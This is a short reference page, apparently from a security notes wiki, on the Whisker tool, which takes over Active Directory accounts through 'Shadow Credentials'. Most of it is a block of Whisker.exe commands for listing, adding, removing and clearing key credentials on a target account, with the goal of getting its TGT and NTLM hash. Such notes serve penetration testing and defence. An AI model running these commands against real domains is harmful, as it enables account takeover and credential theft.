---
tags:
  - tool
---
# Whisker

[Whisker](https://github.com/eladshamir/Whisker) is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account.

## Capabilities

```powershell
# Read value of msDS-KeyCredentialLink attribute of the target
.\Whisker.exe list /target:$USER

# Generate certificate and print the rubeus command needed to retrieve the account's TGT and NTLM hash
.\Whisker.exe add /target:$USER

# List value of the new credential
.\Whisker.exe list /target:$USER

# Remove specific value from msDS-KeyCredentialLink attribute
.\Whisker.exe remove /target:$USER /deviceid:$DEVICE_ID

# Clear all values from the msDS-KeyCredentialLink attribute
.\Whisker.exe clear /target:$USER
```

**Note:** Clearing the `msDS-KeyCredentialLink` attribute of accounts configured for passwordless authentication will cause disruptions.
